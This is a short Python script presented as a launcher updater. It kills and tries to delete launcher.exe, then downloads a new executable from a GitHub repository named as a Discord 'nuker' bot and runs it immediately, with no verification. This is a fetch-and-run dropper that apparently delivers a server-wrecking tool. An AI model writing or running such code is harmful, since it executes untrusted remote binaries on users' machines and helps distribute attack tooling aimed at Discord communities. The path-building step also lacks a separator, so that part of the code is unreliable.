import urllib.request
import os



os.system('title updating launcher...')


def remove_old_launcher():
    try:
        os.system('taskkill /f /im launcher.exe')
        work_folder = str(os.getcwd())
        os.remove(work_folder + 'launcher.exe')
    except: pass

remove_old_launcher()

print('updating launcher...')
urllib.request.urlretrieve("https://github.com/glitch65/Discord-Five-nuker-bot/raw/launcher/launcher.exe", "launcher.exe")

os.system('launcher.exe')